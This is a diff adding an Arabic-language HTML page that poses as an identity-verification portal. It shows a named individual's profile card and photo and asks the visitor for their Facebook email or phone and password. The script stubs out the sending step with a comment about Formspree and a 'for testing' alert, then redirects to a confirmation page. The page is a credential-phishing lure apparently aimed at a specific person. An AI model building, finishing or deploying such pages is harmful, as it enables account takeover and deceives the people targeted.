@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - بوابة الخدمات</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #e9eef2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header .logo {
+            color: #1a4d8c;
+            font-size: 2.2rem;
+            font-weight: 600;
+        }
+        .profile-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        .profile-pic {
+            width: 150px;
+            height: 100px;
+            border-radius: 70%;
+            background-image: url('https://g.top4top.io/p_3715grun70.jpg');
+            background-size: cover;
+            background-position: center;
+            border: 3px solid #1a4d8c;
+        }
+        .profile-info h3 {
+            color: #0a1c2f;
+            font-size: 1.2rem;
+        }
+        .profile-info p {
+            color: #4a5b6b;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+        .login-card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.06);
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            color: #0a1c2f;
+            font-weight: 500;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #ccd8e4;
+            border-radius: 12px;
+            font-size: 15px;
+            direction: ltr;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a4d8c;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #1a4d8c;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .info-note {
+            background: #f0f5fa;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 20px 0;
+            font-size: 0.9rem;
+            color: #1a4d8c;
+            text-align: center;
+            border-right: 4px solid #1a4d8c;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 30px;
+            color: #7a8b9b;
+            font-size: 0.8rem;
+        }
+        .footer-links a {
+            color: #7a8b9b;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">منصة التحقق</div>
+        </div>
+
+        <div class="profile-card">
+            <div class="profile-pic"></div>
+            <div class="profile-info">
+                <h3>لخضر شبابحة</h3>
+                <p>تم العثور على حسابك • أنت مؤهل للخدمة</p>
+            </div>
+        </div>
+
+        <div class="login-card">
+            <div class="info-note">
+                لإكمال عملية التحقق، يرجى إدخال بيانات الدخول الخاصة بحسابك على فيسبوك.
+            </div>
+
+            <form id="loginForm" onsubmit="return false;">
+                <div class="input-group">
+                    <label>البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" class="input-field" id="email" placeholder="example@email.com">
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" class="input-field" id="password" placeholder="********">
+                </div>
+                <button type="button" class="btn-login" onclick="submitForm()">متابعة</button>
+            </form>
+
+            <div style="text-align: center; margin: 15px 0;">
+                <a href="#" style="color: #1a4d8c; text-decoration: none; font-size: 0.9rem;">نسيت كلمة المرور؟</a>
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">شروط الخدمة</a>
+            <a href="#">سياسة الخصوصية</a>
+            <a href="#">مساعدة</a>
+            <a href="#">اتصل بنا</a>
+        </div>
+    </div>
+
+    <script>
+        function submitForm() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('الرجاء إدخال جميع الحقول');
+                return;
+            }
+
+            // هنا يتم الإرسال إلى Formspree
+            alert('تم إرسال البيانات (لأغراض الاختبار)');
+            
+            // بعد ثانيتين، انتقل إلى صفحة التأكيد
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
